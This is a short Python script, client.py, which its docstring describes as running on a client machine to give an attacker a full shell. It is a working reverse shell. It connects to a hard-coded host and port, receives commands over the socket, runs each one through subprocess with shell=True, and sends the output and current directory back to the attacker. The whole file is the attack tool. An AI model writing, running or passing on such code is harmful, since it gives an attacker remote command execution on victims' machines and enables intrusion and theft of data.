"""
Author: Ahad Sheriff
client.py is run on client machine and establishes socket connection to attackers machine
when this script is run, an attacker gets a full shell on the client machine
"""

import os
import socket
import subprocess

host = '192.168.1.226'
port = 9999
sock = socket.socket()
sock.connect((host, port))

while True:
    data = sock.recv(1024)
    # cd to change directories properly
    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8"))
    if len(data) > 0:
        # open a reverse shell to send commands
        command = subprocess.Popen(data[:].decode("utf-8"), shell=True,
                                   stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        outputBytes = command.stdout.read() + command.stderr.read()
        outputString = str(outputBytes, "utf-8")

        # os.getcwd() gets current working directory that the client is in.
        sock.send(str.encode(outputString + str(os.getcwd()) + '> '))

        # comment the following line if you don't want commands to be echoed.
        print(outputString)

sock.close()
